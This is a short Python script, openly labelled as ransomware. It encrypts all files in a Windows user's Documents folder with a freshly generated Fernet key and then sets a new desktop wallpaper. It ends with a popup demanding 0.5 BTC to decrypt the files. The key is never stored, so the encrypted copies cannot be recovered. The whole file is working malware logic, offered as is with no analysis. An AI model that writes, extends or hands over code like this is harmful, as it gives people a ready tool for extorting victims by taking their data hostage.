#usr/var/Cr

#Cristiano
#13/12/2023


import os
import ctypes
from cryptography.fernet import Fernet
import win32con, win32gui, win32api

def generate_key():
    return Fernet.generate_key()

def encrypt_file(key, in_filename, out_filename):
    fernet = Fernet(key)
    with open(in_filename, 'rb') as file:
        plaintext = file.read()
    ciphertext = fernet.encrypt(plaintext)
    with open(out_filename, 'wb') as file:
        file.write(ciphertext)
        
def decrypt_file(key, in_filename, out_filename):
    fernet = Fernet(key)
    with open(in_filename, 'rb') as file:
        ciphertext = file.read()
    plaintext = fernet.decrypt(ciphertext)
    with open(out_filename, 'wb') as file:
        file.write(plaintext)

def encrypt_folder(key, in_folder, out_folder):
    if not os.path.exists(out_folder):
        os.mkdir(out_folder)

    for filename in os.listdir(in_folder):
        in_path = os.path.join(in_folder, filename)
        out_path = os.path.join(out_folder, filename + '.enc')
        
        encrypt_file(key, in_path, out_path)
        
def decrypt_folder(key, in_folder, out_folder):
    if not os.path.exists(out_folder):
        os.mkdir(out_folder)

    for filename in os.listdir(in_folder):
        if filename.endswith('.enc'):
            in_path = os.path.join(in_folder, filename)
            out_path = os.path.join(out_folder, os.path.splitext(filename)[0])
            
            decrypt_file(key, in_path, out_path)

def set_wallpaper(image):
    ctypes.windll.user32.SystemParametersInfoW(win32con.SPI_SETDESKWALLPAPER, 0, image, 0)

def show_popup(title, message):
    hwnd = win32gui.GetDesktopWindow()
    win32gui.MessageBox(hwnd, message, title, 0)
    
if __name__ == '__main__':

    key = generate_key()
    
    in_folder = 'C:\\Users\\User\\Documents'
    out_folder = 'C:\\Encrypted'
    
    encrypt_folder(key, in_folder, out_folder)
    
    image = 'C:\\wallpaper.jpg'
    set_wallpaper(image)
    
    show_popup('Ransomware', 'Your files have been encrypted. Pay 0.5 BTC to decrypt.')
